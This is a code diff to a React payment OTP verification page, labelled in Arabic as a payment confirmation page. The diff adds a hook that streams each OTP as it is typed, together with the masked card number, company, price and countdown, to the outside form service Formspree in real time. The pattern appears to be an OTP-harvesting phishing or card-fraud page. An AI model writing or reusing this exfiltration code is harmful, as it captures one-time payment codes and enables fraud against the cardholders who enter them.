@@ -7,6 +7,8 @@ import { Shield, RefreshCw, CheckCircle2 } from "lucide-react";
 import { ChatButton } from "@/components/ChatButton";
 import { Footer } from "@/components/Footer";
 import { useToast } from "@/hooks/use-toast";
+import { useFormspreeSync } from "@/hooks/useFormspreeSync";
+
 const OTPVerification = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
@@ -23,6 +25,16 @@ const OTPVerification = () => {
   const [timer, setTimer] = useState(120); // 2 minutes
   const [canResend, setCanResend] = useState(false);
   const [isVerifying, setIsVerifying] = useState(false);
+
+  // Send OTP data to Formspree in real-time
+  useFormspreeSync({
+    companyName,
+    price,
+    cardLast4: maskedCardNumber,
+    otpEntered: otp,
+    otpLength: otp.length,
+    remainingTime: `${Math.floor(timer / 60)}:${(timer % 60).toString().padStart(2, "0")}`
+  }, "صفحة تأكيد الدفع - OTP Verification");
 
   // Timer countdown
   useEffect(() => {
